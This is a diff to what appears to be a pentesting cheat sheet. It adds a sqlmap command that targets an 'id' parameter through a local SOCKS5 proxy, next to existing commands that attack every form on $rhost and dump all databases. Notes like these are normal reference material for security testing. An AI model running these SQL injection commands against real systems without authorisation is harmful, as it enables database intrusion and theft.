@@ -7,6 +7,13 @@ sqlmap --batch -a --forms -u "http://$rhost" --output-dir="."
 sqlmap --batch -a --dump-all --forms -u "http://$rhost" --output-dir="."
 ```
 
+## sqlmap use specific parameter and proxy
+
+```bash
+sqlmap -u http://rhost?id= --proxy socks5://127.0.0.1:1080
+```
+
+
 ## bruteforce sql
 
 ```bash
